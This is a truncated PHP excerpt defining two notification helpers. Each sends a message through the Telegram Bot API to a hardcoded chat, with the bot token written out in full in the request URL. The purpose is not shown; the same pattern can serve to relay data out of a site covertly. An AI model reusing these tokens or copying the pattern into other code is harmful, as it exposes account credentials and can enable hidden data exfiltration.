...
if (!function_exists('send_notification_2')) {
	...
	function send_notification_2($message)
	{
		...
		curl_setopt_array($curl, array(
			CURLOPT_URL => 'https://api.telegram.org/bot6514786228:AAHdBbzRsl-3PgKa45BNyyGLJITElMZ2Xhg/sendMessage?chat_id=5831063571',
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_ENCODING => '',
			CURLOPT_MAXREDIRS => 10,
			CURLOPT_TIMEOUT => 0,
...
if (!function_exists('send_notification_3')) {
    ...
    function send_notification_3($message)
    {
        ...
        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://api.telegram.org/bot7020604337:AAGMFgpvBxh1hrERZb9mgWlWuPTKGirBQEQ/sendMessage?chat_id=7001670080',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
